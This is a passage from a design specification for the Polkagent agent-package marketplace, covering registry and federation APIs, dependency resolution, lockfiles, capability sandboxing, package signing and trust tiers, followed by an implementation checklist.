    "last_advisory_check": "2026-07-30T06:00:00Z"
  }
}
```

#### A.2.2 Search and discovery API

The search API supports structured and free-text queries:

```rust
pub struct SearchQuery {
    /// Free-text query. Matched against name, description, and keywords.
    pub q: Option<String>,
    /// Filter by package type.
    pub package_type: Option<PackageType>,
    /// Filter by one or more categories.
    pub categories: Vec<String>,
    /// Filter by minimum trust tier.
    pub min_trust: Option<TrustTier>,
    /// Filter by compatibility with a specific polkagent version.
    pub polkagent_version: Option<Version>,
    /// Filter by target architecture.
    pub architecture: Option<Architecture>,
    /// Filter by declared capability (returns packages that declare this capability).
    pub has_capability: Option<CapabilityCategory>,
    /// Exclude packages with known vulnerabilities.
    pub exclude_vulnerable: bool,
    /// Sort order.
    pub sort: SearchSort,
    /// Pagination.
    pub page: u32,
    pub per_page: u32,  // Max 100.
}

pub enum SearchSort {
    Relevance,       // Default for text queries.
    Downloads,       // By install count.
    RecentlyUpdated, // By publish timestamp.
    Rating,          // By average rating.
    Name,            // Alphabetical.
}

pub struct SearchResults {
    pub total: u64,
    pub page: u32,
    pub results: Vec<SearchResult>,
}

pub struct SearchResult {
    pub name: String,
    pub version: String,        // Latest stable version.
    pub package_type: PackageType,
    pub description: String,
    pub trust_tier: TrustTier,
    pub publisher: PublisherSummary,
    pub downloads: u64,
    pub rating: Option<f32>,
    pub vulnerability_status: VulnerabilityStatus,
    pub updated_at: DateTime<Utc>,
}
```

HTTP endpoint (GET `/api/v1/packages/search`):

```
GET /api/v1/packages/search?q=treasury+monitor&type=skill&min_trust=signed&sort=relevance&page=1&per_page=20
Authorization: Bearer <token>   (optional for public registries)

200 OK
Content-Type: application/json

{
  "total": 3,
  "page": 1,
  "results": [ ... ]
}
```

#### A.2.3 Federation protocol

Federation uses a pull-based discovery model. A registry advertises itself as
a federation peer and allows other registries to query its index.

**Federation handshake:**

```
GET /api/v1/federation/info

200 OK
{
  "registry_id": "polkadot-community",
  "display_name": "Polkadot Community Registry",
  "api_version": "1",
  "capabilities": ["search", "metadata", "download", "advisories"],
  "public_key": "...",  # Ed25519 public key for signed responses
  "terms": "https://registry.polkadot-community.org/terms"
}
```

**Federated search:** The local registry fans out the query to configured
peers in parallel, merges results, deduplicates by `(name, version)`,
and annotates each result with its source registry. Timeout per peer is
configurable (default 3 s). A peer timeout is logged but does not fail
the search — the local results are returned with the timed-out peer noted
as unavailable.

**Federation trust weighting:** Results from a peer with `trust_weight = 0.8`
appear in search rankings as if their trust signals were multiplied by 0.8.
This allows an operator to express "I trust this peer's packages somewhat
less than my own registry's curation."

**Advisory propagation:** When a registry receives a new advisory, it pushes
it to all federation peers that have mirrored the affected package:

```
POST /api/v1/federation/advisories
Content-Type: application/json
X-Registry-Signature: <Ed25519 signature>

{
  "advisory_id": "POLKA-2026-042",
  "affected_package": "treasury-monitor",
  "affected_versions": ">=1.0.0, <1.0.3",
  "severity": "high",
  "source_registry": "polkadot-community",
  ...
}
```

Peers record the advisory with source attribution. The receiving registry
does not automatically act on it; the operator's advisory policy governs
the response.

#### A.2.4 Mirroring and offline support

A mirror registry replicates package content from one or more upstream
registries on a configurable schedule:

```toml
# registry-config.toml
[mirror]
enabled   = true
schedule  = "0 */6 * * *"   # Cron: every 6 hours.

[[mirror.sources]]
registry  = "https://registry.polkadot.network/api/v1"
filter    = { categories = ["governance", "infrastructure"], min_trust = "signed" }
verify_signatures = true
max_storage_gb    = 50

[[mirror.sources]]
registry  = "https://registry.internal:8443/api/v1"
filter    = { all = true }
verify_signatures = true
```

Mirror operation:

1. Fetch the upstream index delta (packages published or updated since last
   mirror run).
2. For each new or updated package, verify the signature against the original
   publisher's identity.
3. Download the content archive and verify the digest.
4. Store locally under the same content-addressed path.
5. Record the mirror timestamp and upstream source in local metadata.
6. Reject and log any package that fails signature or digest verification.

For fully offline (air-gapped) environments, the initial mirror is created on
a connected machine and transferred via physical media. The import process
re-verifies all signatures and digests using the embedded provenance data.
No network connectivity to the upstream registry is required after import.

#### A.2.5 Sideloading from filesystem

Sideloading installs a package from a local directory or archive without
using a registry. The resolver treats sideloaded packages identically to
registry packages for sandbox and capability purposes.

```bash
# Sideload from a directory containing polkagent.manifest.toml
polkagent package install --path ./my-local-tool/

# Sideload from a .pak archive
polkagent package install --path ./my-local-tool-1.0.0.pak

# Sideload with explicit trust acknowledgment (required for unsigned packages)
polkagent package install --path ./unsigned-tool/ --trust unsigned --acknowledge-risk

# List all sideloaded packages
polkagent package list --source sideloaded
```

A directory containing a `dev.toml` in `.polkagent/` is treated as a
development sideload: it is rebuilt on demand and is never offered as a
dependency to other packages resolved from a registry.

---

### A.3 Package Resolution Algorithm

#### A.3.1 Dependency resolution (PubGrub algorithm)

Polkagent uses the **PubGrub** algorithm for dependency resolution. PubGrub
is the algorithm used by pub (Dart's package manager) and is a partial unit
propagation SAT solver specialized for SemVer ranges. It has the following
properties relevant to Polkagent:

- **Conflict-driven:** When a conflict is found, it generates an incompatibility
  clause that allows the solver to backtrack efficiently without re-exploring
  the same dead ends.
- **Human-readable error messages:** The algorithm's conflict derivation
  naturally produces an explanation of why resolution failed, naming the
  packages and constraints involved.
- **No ambiguity:** Given the same inputs, PubGrub always produces the same
  output. Resolution is deterministic.

```rust
/// PubGrub-based resolver entry point.
pub async fn resolve(
    root: &PackageManifest,
    ctx: &ResolutionContext,
) -> Result<ResolutionResult, ResolverError> {
    let mut solver = PubGrubSolver::new(ctx.registries.clone());

    // Seed the solver with root package constraints.
    for (dep_name, dep_req) in &root.dependencies {
        solver.add_constraint(dep_name.clone(), dep_req.version.clone());
    }

    // Add platform constraints as hard incompatibilities.
    solver.add_platform_filter(ctx.platform.clone());

    // Add operator allow/deny list as hard incompatibilities.
    solver.add_policy_filter(ctx.package_policy.clone());

    // If a lockfile exists, seed preferred versions from it (lock preference).
    if let Some(lock) = &ctx.existing_lock {
        solver.seed_preferences_from_lockfile(lock);
    }

    // Run the solver. Fetches version lists from registries lazily.
    match solver.solve().await? {
        SolveResult::Solution(packages) => {
            let lockfile = generate_lockfile(&packages, ctx).await?;
            let warnings = collect_warnings(&packages);
            Ok(ResolutionResult::Resolved { packages, lockfile, warnings })
        }
        SolveResult::Conflict(incompatibilities) => {
            let explanation = explain_conflict(&incompatibilities);
            Ok(ResolutionResult::Conflict {
                conflicts: incompatibilities,
                suggestions: suggest_resolutions(&incompatibilities),
            })
        }
    }
}
```

#### A.3.2 Version constraint syntax

Polkagent version constraints follow the same syntax as Cargo's SemVer ranges:

| Syntax | Meaning | Matches |
|---|---|---|
| `^1.2.3` | Compatible with 1.2.3 | `>=1.2.3, <2.0.0` |
| `^1.2`   | Compatible with 1.2   | `>=1.2.0, <2.0.0` |
| `^1`     | Compatible with 1     | `>=1.0.0, <2.0.0` |
| `~1.2.3` | Approximately 1.2.3   | `>=1.2.3, <1.3.0` |
| `>=1.0.0, <2.0.0` | Explicit range | Exactly as written |
| `=1.2.3` | Exact version pinning | `1.2.3` only |
| `*`      | Any version           | Any stable version |

Pre-release versions (e.g., `1.0.0-alpha.1`) are only selected if the
constraint explicitly mentions a pre-release marker (e.g., `>=1.0.0-alpha.1`).
Pre-release versions are never selected by `^`, `~`, or `*`.

#### A.3.3 Lockfile format

The lockfile is a TOML file that captures the exact resolved state. It is
committed to version control for reproducible installations.

```toml
# polkagent.lock
# Generated by polkagent resolver. Do not edit manually.
# Regenerate with: polkagent package lock --update

schema_version = "1"
generated_at   = "2026-07-30T12:00:00Z"
resolver       = "pubgrub/0.3.1"

[[package]]
name     = "treasury-monitor"
version  = "1.0.0"
source   = "registry+https://registry.polkadot.network/api/v1"
digest   = "sha256:e3b0c44298fc1c149afbf4c8996fb924..."
trust_tier = "verified"
dependencies = ["polkadot-chain-profile", "openGov-schema"]

[[package]]
name     = "polkadot-chain-profile"
version  = "1.2.3"
source   = "registry+https://registry.polkadot.network/api/v1"
digest   = "sha256:7b23e7c5a8d9f1b2c3d4e5f6a7b8c9d0..."
trust_tier = "verified"
dependencies = []

[[package]]
name     = "openGov-schema"
version  = "2.1.0"
source   = "registry+https://registry.polkadot.network/api/v1"
digest   = "sha256:c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4..."
trust_tier = "verified"
dependencies = []

# Sideloaded packages are recorded with their path and hash.
# [[package]]
# name   = "my-local-helper"
# version = "0.1.0"
# source = "path+file:///workspace/my-local-helper"
# digest = "sha256:..."
# trust_tier = "unsigned"
```

Resolution from lockfile:

- When a lockfile exists, the resolver prefers the pinned versions for
  packages that satisfy the current constraints.
- `polkagent package install` uses the lockfile by default.
- `polkagent package update` ignores the lockfile and resolves fresh, then
  writes a new lockfile.
- `polkagent package update --package treasury-monitor` updates only the
  named package and its affected subtree, leaving others pinned.

#### A.3.4 Conflict detection and resolution

When the solver cannot find a valid assignment, it produces a structured
conflict report:

```
Error: dependency resolution failed

  treasury-monitor v1.0.0 requires polkadot-chain-profile >=1.0.0, <2.0.0
  governance-kit v2.0.0 requires polkadot-chain-profile >=2.0.0

  polkadot-chain-profile has no version satisfying both >=1.0.0,<2.0.0 and >=2.0.0

Suggestions:
  1. Upgrade treasury-monitor to a version that supports polkadot-chain-profile >=2.0.0
     (treasury-monitor v1.1.0 requires polkadot-chain-profile >=1.5.0, <3.0.0)
  2. Use governance-kit v1.x, which requires polkadot-chain-profile >=1.0.0
```

The solver never silently selects an unexpected version. Every deviation from
the preferred (locked) version is reported as a warning.

---

### A.4 Sandbox Isolation

#### A.4.1 Capability declaration vocabulary

The complete capability vocabulary, with all scope parameters:

```toml
# Network access
[capabilities.network]
required  = true | false
hosts     = ["hostname", "*.wildcard.example.com"]
protocols = ["https", "wss", "http", "ws"]
ports     = [443, 8443]     # Optional; defaults to standard ports for protocol.
reason    = "..."

# Chain state read
[capabilities.chain_read]
required  = true | false
networks  = ["polkadot", "kusama", "asset-hub-polkadot", ...]
pallets   = ["Treasury", "Referenda", ...]  # Empty = all pallets (broad; prefer specific).
storage_keys = []  # Optional: restrict to specific storage key prefixes.
reason    = "..."

# Chain state write (extrinsics)
[capabilities.chain_write]
required  = true | false
networks  = ["polkadot", ...]
pallets   = ["ConvictionVoting", ...]
calls     = ["vote", "remove_vote"]   # Specific call names. Empty = all calls in pallet.
reason    = "..."

# Filesystem
[capabilities.filesystem]
required    = true | false
read_paths  = ["/workspace/src/", "/tmp/polkagent/"]
write_paths = ["/workspace/output/"]
create      = true | false   # Whether the package may create new files.
reason      = "..."

# Model invocation
[capabilities.model_invoke]
required  = true | false
providers = ["anthropic", "openai", "ollama"]
families  = ["claude-3", "gpt-4"]
reason    = "..."

# Tool invocation (inter-package)
[capabilities.tool_invoke]
required = true | false
tools    = ["web_search@>=1.0.0", "chain_reader@^2.0.0"]
reason   = "..."

# Memory read
[capabilities.memory_read]
required        = true | false
scopes          = ["workspace", "episodic", "semantic"]
classifications = ["Public", "Internal"]
reason          = "..."

# Memory write
[capabilities.memory_write]
required        = true | false
scopes          = ["workspace"]
classifications = ["Public"]
reason          = "..."

# Secret access
[capabilities.secret_read]
required   = true | false
categories = ["rpc_api_key", "anthropic_api_key"]
reason     = "..."

# Process spawn
[capabilities.process_spawn]
required  = true | false
commands  = ["cargo", "rustfmt", "node"]
max_concurrent = 2
reason    = "..."

# Economic
[capabilities.economic]
required                    = true | false
asset_types                 = ["DOT", "KSM", "USDC"]
max_amount_per_invocation   = "0.1"   # In the declared asset unit.
max_amount_per_hour         = "1.0"
networks                    = ["polkadot"]
reason                      = "..."
```

#### A.4.2 Sandbox enforcement per package type

The enforcer checks every host API call against the intersection of three
independent grants. All three must permit the call:

1. **Declared capabilities** in the package manifest.
2. **Operator grant** configured in the deployment policy.
3. **`ResolvedGrant`** from PRD-07, computed per-run from the current context.

```rust
pub struct CapabilityEnforcer {
    /// Capabilities declared by the package.
    declared: CapabilitySet,
    /// Capabilities granted by the operator.
    operator_grant: CapabilitySet,
    /// Per-run resolved grant from PRD-07.
    resolved_grant: ResolvedGrant,
    /// Audit logger.
    audit: Arc<AuditLogger>,
}

impl CapabilityEnforcer {
    pub fn check_network(&self, host: &str, protocol: &str) -> Result<(), CapabilityDenied> {
        let declared_ok  = self.declared.network_allows(host, protocol);
        let operator_ok  = self.operator_grant.network_allows(host, protocol);
        let resolved_ok  = self.resolved_grant.network_allows(host, protocol);

        let allowed = declared_ok && operator_ok && resolved_ok;

        self.audit.log_network_check(host, protocol, allowed);

        if !allowed {
            let reason = if !declared_ok {
                DenialReason::NotDeclared
            } else if !operator_ok {
                DenialReason::OperatorNotGranted
            } else {
                DenialReason::ResolvedGrantDenied
            };
            return Err(CapabilityDenied { capability: "network", host: host.into(), reason });
        }
        Ok(())
    }

    // Similar methods for chain_read, chain_write, filesystem, etc.
}
```

#### A.4.3 Runtime capability checking

Every host API call follows this path:

```
Package code (WASM / process)
        |
        | host call (WIT import)
        v
 SandboxHostApi::http_request(request)
        |
        v
 CapabilityEnforcer::check_network(host, protocol)
        |
    denied? --> AuditLogger::log_denial() --> return Err(CapabilityDenied)
        |
      ok
        |
        v
 ResourceLimiter::charge_request(size)
        |
    over limit? --> AuditLogger::log_resource_exhaustion() --> return Err(ResourceExhausted)
        |
      ok
        |
        v
 HttpClient::send(request)  [host-side, not in sandbox]
        |
        v
 Strip response headers above classification ceiling
        |
        v
 return Ok(response) to package
```

#### A.4.4 Revocation of capabilities

An operator can revoke capabilities from an installed package at any time
without uninstalling it:

```bash
# Revoke a specific capability
polkagent package revoke-capability treasury-monitor --capability chain_write

# Revoke all capabilities (effectively deactivates the package)
polkagent package revoke-capability treasury-monitor --all

# Restore a previously revoked capability
polkagent package grant treasury-monitor --capability chain_read

# View current effective capabilities for a package
polkagent package capabilities treasury-monitor
```

Capability revocation is recorded in the local policy store and takes effect
immediately for all new invocations. In-flight invocations that have already
passed the capability check are not interrupted, but subsequent host API calls
within the same invocation are re-checked.

---

## APPENDIX B: TRUST MODEL

### B.1 Package Signing

#### B.1.1 Ed25519 signature scheme

For scenarios where keyless signing is not available (self-hosted registries
without OIDC infrastructure, air-gapped environments, or long-lived publisher
identities), Polkagent supports direct Ed25519 key signing as a complement to
the primary cosign v3 keyless mechanism.

Key format and storage:

```bash
# Generate a publisher keypair (stored in the platform's key store)
polkagent identity key generate --type ed25519 --label "Example Team publish key"

# Export the public key for registry registration
polkagent identity key export --label "Example Team publish key" --format jwk

# Sign a package with a named key
polkagent package sign --key "Example Team publish key"

# Verify a package signature independently
polkagent package verify --package treasury-monitor-1.0.0.pak \
  --public-key ./example-team-pubkey.jwk
```

Ed25519 signatures cover the following material, concatenated in order:

1. The serialized manifest (canonical TOML, sorted keys, UTF-8).
2. The Merkle root of the content archive.
3. The publisher's identity string (registry account ID or Polkadot address).
4. The Unix timestamp at signing time (8 bytes, big-endian).

This binding prevents replay attacks (timestamp), content substitution
(Merkle root), and manifest forgery (manifest hash).

**Signature bundle format (stored in `polkagent.manifest.toml` at
`[provenance]` after signing):**

```toml
[provenance.signature]
scheme     = "ed25519"
public_key = "base64url:MCowBQYDK2VwAyEA..."  # DER-encoded Ed25519 public key, base64url.
signature  = "base64url:..."                    # Raw 64-byte Ed25519 signature, base64url.
signed_at  = "2026-07-30T12:00:00Z"
covers     = ["manifest", "content_merkle_root", "publisher_id", "timestamp"]
```

#### B.1.2 Publisher identity verification

Publisher identity verification is performed by the registry at publication
time and stored as verified claims:

**Polkadot on-chain identity verification flow:**

1. The publisher registers their Polkadot address with the registry.
2. The registry issues a challenge string (random nonce + registry ID + timestamp).
3. The publisher signs the challenge using their Polkadot account key.
4. The registry verifies the signature using the submitted address.
5. If the address has a People Chain identity with a registrar judgment, the
   registry records the judgment level as additional trust weight.
6. The verified claim is stored and linked to the publisher's registry account.

```rust
pub struct VerifiedClaim {
    pub claim_type: ClaimType,   // PolkadotAccount | Domain | Organization | OidcCi
    pub claim_value: String,     // Address, domain, org name, or OIDC subject.
    pub verified_at: DateTime<Utc>,
    pub verifier: String,        // "registry" | auditor identity | "polkadot-people-chain"
    pub expires_at: Option<DateTime<Utc>>,
    pub evidence: ClaimEvidence, // Signed challenge response, DNS record proof, etc.
}
```

#### B.1.3 Signature chain of trust

For packages published from CI/CD (the primary path), the chain is:

```
OIDC provider (GitHub Actions)
        |
        | issues short-lived OIDC token
        v
Sigstore Fulcio CA
        |
        | issues certificate binding OIDC identity to ephemeral key
        v
cosign v3 keyless sign
        |
        | produces signature + certificate bundle
        v
Sigstore Rekor transparency log
        |
        | records the bundle with log index
        v
Package manifest [provenance.signature]
        |
        | embedded in published package
        v
Polkagent installer
        |
        | verifies: signature, certificate chain, Rekor entry, pinned signer identity
        v
Trust granted (or denied)
```

The installer pins the expected signer identity to a specific OIDC subject
(e.g., `https://github.com/example/treasury-monitor/.github/workflows/publish.yml@refs/heads/main`).
Any package whose certificate subject does not match the pinned identity for
that publisher is rejected, even if the signature is cryptographically valid.
This prevents a compromised alternate workflow from publishing under the same
publisher namespace.

#### B.1.4 Revocation mechanism

Signing keys and publisher identities can be revoked through multiple paths:

**Key revocation (Ed25519 direct signing):**

```bash
# Revoke a signing key (marks all packages signed by this key as needing re-verification)
polkagent identity key revoke --label "Example Team publish key" \
  --reason "Key compromise suspected" \
  --notify-registry https://registry.polkadot.network/api/v1
```

The registry records the revocation with a timestamp and distributes it to
federation peers. Packages signed by a revoked key are downgraded from their
current trust tier to `unsigned` with a visible revocation notice.

**OIDC / cosign v3 keyless revocation:**

For keyless signing, the revocation target is the OIDC subject (e.g., the
GitHub Actions workflow). An operator who determines that a CI/CD pipeline
has been compromised submits a revocation request to the registry naming the
compromised OIDC subject:

```
POST /api/v1/revocations/oidc-subject
{
  "subject": "https://github.com/example/treasury-monitor/.github/workflows/publish.yml@refs/heads/main",
  "reason": "CI pipeline compromised via dependency confusion attack",
  "affected_since": "2026-07-28T00:00:00Z",
  "authority_signature": "..."  # Signed by the registry operator key.
}
```

All packages signed by that OIDC subject after the `affected_since` timestamp
are queued for re-verification.

**Publisher account revocation:**

When a registry revokes a publisher account (due to confirmed malicious
behavior), all packages by that publisher are moved to `unsigned` trust tier
and flagged with a revocation notice. Existing installations receive a
notification at next update check.

---

### B.2 Trust Tiers

#### B.2.1 Tier definitions

| Tier | Code | Requirements | Meaning |
|---|---|---|---|
| **Unverified** | `0` | Valid manifest only. No signature. | Package content has not been cryptographically bound to any identity. Anyone could have produced or modified it. |
| **Signed** | `1` | Valid manifest + valid cosign v3 or Ed25519 signature. Signature verified against Rekor (for keyless). | Package content is cryptographically bound to an identity. Publisher is known but not independently verified. |
| **Verified** | `2` | Signed + at least one verified identity claim (Polkadot on-chain identity with registrar judgment, domain verification, or organization verification) + SLSA Build Level 2 provenance attestation. | Publisher identity has been corroborated against an external authority. Build provenance is auditable. |
| **Curated** | `3` | Verified + explicitly included in at least one named curated collection signed by a recognized curator. Curator must disclose selection criteria and any commercial arrangement. | An independent party has reviewed the package and deemed it suitable for their curated list. |

Trust tier assignment is performed by the registry at publication time and
re-evaluated when any of the underlying conditions change (key revocation,
identity expiry, curator removal).

#### B.2.2 UI presentation per tier

| Tier | Icon | Badge color | Warning text | Install flow |
|---|---|---|---|---|
| Unverified | Warning triangle | Red | "This package has no signature. Anyone could have produced or modified it. Install only if you trust the source directly." | Requires explicit `--trust unsigned` flag on CLI. TUI shows blocking confirmation dialog. |
| Signed | Lock icon | Yellow/amber | "Publisher identity has not been independently verified." | Standard install flow. Publisher identity shown. |
| Verified | Verified checkmark | Blue | None (positive signal displayed instead). | Standard install flow. Verification method shown. |
| Curated | Star + checkmark | Green | None (curator endorsement displayed). | Standard install flow. Curator name and collection shown. |

In TUI surfaces (see Appendix E), trust tier is communicated through:

- A status badge character rendered in the list row (analogous to Roko's
  `PrdStatus::badge()` pattern: a fixed-width string like `UNSN`, `SIGN`,
  `VRFD`, `CRTD`).
- The badge foreground color following the tier table above.
- A trust detail section in the package detail panel.

#### B.2.3 Automatic vs manual trust promotion

**Automatic promotion rules (performed by registry, no human review):**

| From | To | Automatic trigger |
|---|---|---|
| Unverified | Signed | Publisher submits a valid signature with the package version. |
| Signed | Verified | Publisher's existing verified identity claims are valid + SLSA L2 provenance present in the package. Registry re-checks verified status on each publication. |

**Manual promotion (requires human action):**

| From | To | Manual trigger |
|---|---|---|
| Any | Curated | A recognized curator explicitly adds the package to a curated collection (pull-request review process, section 6.1.1). |
| Signed | Verified (new publisher) | First-time publisher submits identity verification proofs and they are reviewed. |

**Automatic demotion rules (no human review required):**

| From | To | Trigger |
|---|---|---|
| Verified | Signed | Publisher's verified identity claims expire or are revoked. |
| Signed | Unverified | Signing key revoked or OIDC subject revoked. |
| Curated | Verified | Package removed from all curated collections. |
| Any | Revoked | Registry issues a revocation (section 9.4). Displayed as a distinct state, not a trust tier. |

Demotions trigger operator notifications for all deployments that have the
affected package installed. The notification includes the demotion reason
and recommended action.

#### B.2.4 Emergency package removal

When a package is confirmed malicious or critically vulnerable, the registry
can initiate emergency removal:

**Phase 1 — Immediate (within 1 hour of confirmation):**
- Package hidden from all search results and discovery APIs.
- Existing installations receive a critical advisory via next update check.
- Federation peers notified via advisory push.
- Publisher account suspended pending investigation.

**Phase 2 — Revocation (within 4 hours):**
- Formal revocation record issued (section 9.4).
- `force_deactivate = true` set on the revocation for confirmed malware.
- Operator notification pushed to all deployments with the package active.

**Phase 3 — Post-incident (within 24 hours):**
- Public advisory published with CVE-style identifier.
- Forensic package content retained (not deleted) for analysis.
- Post-incident communication per section 13.4.

The operator retains final authority. A `force_deactivate` revocation sends
a deactivation signal; the operator can override it with explicit
acknowledgment. The package content is never silently deleted from local
stores.

---

## APPENDIX C: IMPLEMENTATION CHECKLIST

Tasks are ordered by implementation phase (section 16.1) and dependency.
Each task has an acceptance criterion that can be used as a test gate.

### Phase 1: Foundation (manifest, sideloading, capability enforcement, sandbox)

- [ ] **C-001** Define and publish the manifest JSON Schema (derived from TOML
  schema in Appendix A.1). Acceptance: `polkagent package validate` passes for
  all example manifests in this document and fails for each field-level
  violation listed in A.1.3.

- [ ] **C-002** Implement manifest parser (TOML → `PackageManifest` Rust struct)
  with full validation. Acceptance: all validation rules in A.1.3 produce the
  documented error codes.

- [ ] **C-003** Implement proc-macro codegen (`#[polkagent_tool]`) that derives
  capability-checked host call stubs from the manifest. Acceptance: a tool that
  calls a capability not declared in its manifest fails to compile.

- [ ] **C-004** Implement data-classification label generation from
  `data_access.classification_floor`. Acceptance: types generated for a
  `Confidential` manifest carry the classification annotation; the host
  enforcer rejects responses tagged above the ceiling.

- [ ] **C-005** Implement sideloading from local directory and `.pak` archive.
  Acceptance: a package installed via `--path` receives the same capability
  review and sandbox enforcement as a registry package.

- [ ] **C-006** Implement the `CapabilityEnforcer` (section 8.3, A.4.2).
  Acceptance: for each capability category, a denied host call returns
  `CapabilityDenied` with the correct `DenialReason`, and the audit log records
  the denial.

- [ ] **C-007** Initialize the Wasmtime store with all three metering mechanisms
  enabled: fuel (`Store::set_fuel`), epoch interruption
  (`Engine::epoch_interruption(true)` + background ticker thread), and
  `ResourceLimiter`. Acceptance: a WASM module that runs an infinite loop is
  terminated by epoch interruption within the configured deadline; a module that
  over-allocates memory is terminated by the `ResourceLimiter`.

- [ ] **C-008** Implement the WIT interface (`polkagent:tool@1.0.0`) and the
  host-side `SandboxHostApi` implementation. Acceptance: a WASM tool compiled
  against the WIT definition can invoke `http_request`, `chain_query`, and
  `log` through the mediated API.

- [ ] **C-009** Implement `select_sandbox_tier` (section 8.2). Acceptance:
  `PackageType::Skill` → `ContextOnly`; unsigned `PackageType::Tool` →
  `Container`; verified `PackageType::Tool` → `Process`.

- [ ] **C-010** Implement package scaffolding (`polkagent package new`).
  Acceptance: `new --type skill`, `new --type tool`, `new --type product_kit`
  each generate a buildable, testable directory with correct manifest template.

### Phase 2: Registry (self-hosted, resolution, signing, lockfile)

- [ ] **C-020** Implement the SQLite-backed registry storage layer. Acceptance:
  `polkagent registry init` creates a valid registry; `polkagent registry serve`
  starts and passes a health check.

- [ ] **C-021** Implement `RegistryApi` trait (section 5.4): `search`,
  `get_metadata`, `download`, `publish`, `trust_signals`, `versions`,
  `advisories`. Acceptance: MKT-010 end-to-end test passes.

- [ ] **C-022** Implement PubGrub resolver (section A.3.1). Acceptance:
  - Diamond dependency resolves to the highest compatible version.
  - Version conflict produces the human-readable error from A.3.4.
  - Resolution from lockfile is deterministic across platforms.

- [ ] **C-023** Implement lockfile generation and consumption (section A.3.3).
  Acceptance: MKT-034 lockfile determinism test passes.

- [ ] **C-024** Implement cosign v3 keyless signing in the publish pipeline
  (section 4.7.1). Acceptance: `polkagent package sign --keyless` produces a
  bundle that `polkagent package verify` validates against Rekor.

- [ ] **C-025** Implement Ed25519 direct signing (section B.1.1). Acceptance:
  signing and verification round-trip correctly; a tampered manifest or content
  fails verification.

- [ ] **C-026** Implement signature verification at install time with pinned
  signer identity. Acceptance: a package whose cosign certificate subject does
  not match the pinned identity is rejected with a clear error.

- [ ] **C-027** Implement offline bundle create/import/verify (section 5.7).
  Acceptance: MKT-014 air-gapped bundle test passes.

- [ ] **C-028** Implement SLSA Build Level 2 provenance generation
  (`polkagent package provenance generate --slsa-level 2`). Acceptance: the
  generated in-toto attestation is parseable and covers all build artifacts.

- [ ] **C-029** Implement the update check and staged update workflow
  (section 9.1–9.2). Acceptance: MKT-050 and MKT-051 tests pass.

- [ ] **C-030** Implement rollback support (section 9.5). Acceptance: MKT-054
  rollback test passes; previous capability grants are restored.

### Phase 3: Public registry (federation, scanning, advisories, trust)

- [ ] **C-040** Implement federation handshake and federated search fanout
  (section A.2.3). Acceptance: MKT-012 multi-registry federation test passes;
  peer timeout does not fail the search.

- [ ] **C-041** Implement mirroring (section A.2.4). Acceptance: MKT-013
  mirror + disconnect + serve test passes.

- [ ] **C-042** Implement Polkadot on-chain identity verification flow
  (section B.1.2). Acceptance: MKT-022 verified publisher identity test passes.

- [ ] **C-043** Implement trust tier assignment and automatic promotion/demotion
  (section B.2.3). Acceptance: all automatic trigger conditions produce the
  correct tier transition and operator notification.

- [ ] **C-044** Implement security advisory publication and distribution
  (section 9.3, A.2.3). Acceptance: MKT-052 advisory handling test passes per
  severity.

- [ ] **C-045** Implement publisher identity revocation (section B.1.4).
  Acceptance: MKT-023 revocation propagation test passes.

- [ ] **C-046** Implement automated malware scanning pipeline (section 13.2).
  Acceptance: MKT-080 malware fixture test passes.

- [ ] **C-047** Implement capability escalation detection on version update.
  Acceptance: a new version requesting `chain_write` when the previous version
  declared only `chain_read` produces a capability-change prompt.

### Phase 4: Product kits

- [ ] **C-050** Implement kit manifest parsing and validation. Acceptance: all
  kit-specific fields in A.1.2 are parsed and validated; role values are
  checked against the enum.

- [ ] **C-051** Implement guided kit installation (section 10.4). Acceptance:
  MKT-060 kit installation test passes; optional packages are selectable.

- [ ] **C-052** Implement kit trust summary aggregation (section 10.6).
  Acceptance: MKT-064 kit trust aggregation test passes.

- [ ] **C-053** Implement kit uninstallation with shared dependency tracking.
  Acceptance: MKT-061 shared dependency uninstall test passes.

- [ ] **C-054** Implement kit update compatibility check. Acceptance: MKT-062
  kit update compatibility test passes.

### Phase 5: Commercial

- [ ] **C-060** Implement pricing model configuration and pre-purchase fee
  disclosure. Acceptance: all fee components from section 11.1 are displayed
  before confirmation.

- [ ] **C-061** Implement revenue sharing calculation and settlement trigger.
  Acceptance: for a $10 purchase with default fee structure, the calculated
  splits match section 11.3 exactly.

- [ ] **C-062** Implement publisher account verification for commercial
  packages. Acceptance: a publisher who sets a non-zero price is required to
  complete at least one verified identity claim before the price takes effect.

### Phase 6: WASM sandbox hardening

- [ ] **C-070** Validate capability attenuation at WIT composition boundaries
  (section 4.6). Acceptance: a composed WASM component that attempts to expose
  a capability its parent world does not grant is rejected at load time.

- [ ] **C-071** Implement container isolation tier (Tier 3, section 8.2).
  Acceptance: an unsigned tool runs in a container with no host filesystem
  access; a syscall outside the allowed set is denied.

- [ ] **C-072** Implement WASM sandbox escape test suite. Acceptance: MKT-043
  WASM sandbox escape test passes across all documented escape vectors.

### Phase 7: Advanced

- [ ] **C-080** Design and prototype on-chain registry index (section 18,
  MKT-Q02). Acceptance: design document reviewed; prototype publishes a package
  manifest to an Asset Hub test network and retrieves it.

- [ ] **C-081** Implement agent service listing and directory (section 3.1,
  agent_service type). Acceptance: MKT-Q08 integration with PRD-08 autonomous
  agent accounts.

---

## APPENDIX D: REFERENCE FILE MAP

| Component | Roko File | Bardo File | Key Patterns Used |
|---|---|---|---|
| Marketplace browser (list + detail split layout) | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/marketplace_view.rs` | — | 35/65 percentage split; `render_job_list` + `render_job_detail`; status icon vocabulary (`○ ◀ ✓ ✗`); scroll-to-keep-selected-visible pattern. |
| Package creation / atelier form | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/marketplace_view.rs` (`render_create_job`) | — | Multi-field form with per-field focus state; `border_style` changes on focus/edit; block cursor (`█`) in editing mode; `Tab`/`Enter`/`Ctrl-S`/`Esc` keybindings. |
| PRD/package list with status badge | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/atelier_view.rs` | — | Fixed-width badge strings (`IDEA`, `DRFT`, `PUBL`, `PLAN`); progress fraction suffix `N/M`; scroll with percentage `Layout::horizontal`. |
| Stats bar / summary header | `/Users/will/dev/nunchi/roko/roko/crates/roko-cli/src/tui/views/atelier_view.rs` (`render_stats_bar`) | — | 5-column equal-percentage layout; `stat()` helper pattern; conditional style (all-done → success color). |
